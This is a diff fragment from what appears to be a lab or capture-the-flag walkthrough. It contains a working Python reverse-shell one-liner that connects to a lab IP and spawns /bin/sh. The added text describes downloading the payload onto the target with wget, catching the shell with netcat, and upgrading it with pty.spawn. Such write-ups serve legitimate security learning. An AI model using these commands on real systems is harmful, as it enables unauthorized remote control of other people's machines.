@@ -139,3 +139,11 @@ This gave me a permanent copy of auth.log in the local directory that won't be o
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+
+I got this code onto the target machine by hosting it on my own webserver and downloading it onto the target with `wget`. Executing it from the webshell while running `netcat` as a listener was enough to get me a non-interactive reverse shell. I solved the final step with the following Python snippet:
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+This was enough to get me a nice interactive shell on the target system.
